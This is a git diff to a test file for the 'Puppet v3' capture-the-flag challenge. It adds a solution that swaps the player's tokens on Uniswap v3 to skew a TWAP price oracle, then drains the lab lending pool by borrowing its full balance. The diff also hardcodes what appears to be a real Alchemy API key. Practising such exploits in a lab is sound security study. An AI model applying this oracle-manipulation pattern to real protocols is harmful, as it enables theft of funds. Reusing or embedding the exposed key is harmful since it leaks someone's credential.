@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/UIF0doqvCMRdtJtowvxsQ7g-8NyvSSVm";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +140,23 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // console.log(await uniswapPool.slot0());
+        const routerJson = require("@uniswap/v3-periphery/artifacts/contracts/interfaces/ISwapRouter.sol/ISwapRouter.json");
+        router = new ethers.Contract("0xE592427A0AEce92De3Edee1F18E0157C05861564", routerJson.abi, player);
+        await token.connect(player).approve(router.address, ethers.constants.MaxUint256);
+        await router.connect(player).exactInputSingle({
+            tokenIn: token.address,
+            tokenOut: weth.address,
+            fee: 3000,
+            recipient: player.address,
+            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE, 
+            amountOutMinimum: 1,
+            sqrtPriceLimitX96: 0
+        }, { gasLimit: 5000000 });
+        await time.increase(100);
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
